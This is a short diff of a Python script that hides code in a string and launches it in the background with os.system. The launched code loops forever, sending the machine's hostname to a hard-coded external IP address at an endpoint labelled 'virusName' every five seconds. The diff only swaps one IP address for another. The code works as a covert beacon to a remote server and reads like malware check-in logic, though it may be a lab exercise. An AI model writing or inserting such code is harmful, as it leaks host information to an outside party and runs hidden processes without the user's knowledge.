@@ -13,7 +13,7 @@ import socket
 import time
 import requests
 while True:
-	requests.get('http://68.183.100.83:8080/api/submit?id=%s&virusName=1' % socket.gethostname())
+	requests.get('http://142.93.124.107:8080/api/submit?id=%s&virusName=1' % socket.gethostname())
 	time.sleep(5)"""
 
 os.system('python -c "%s" &' % code)
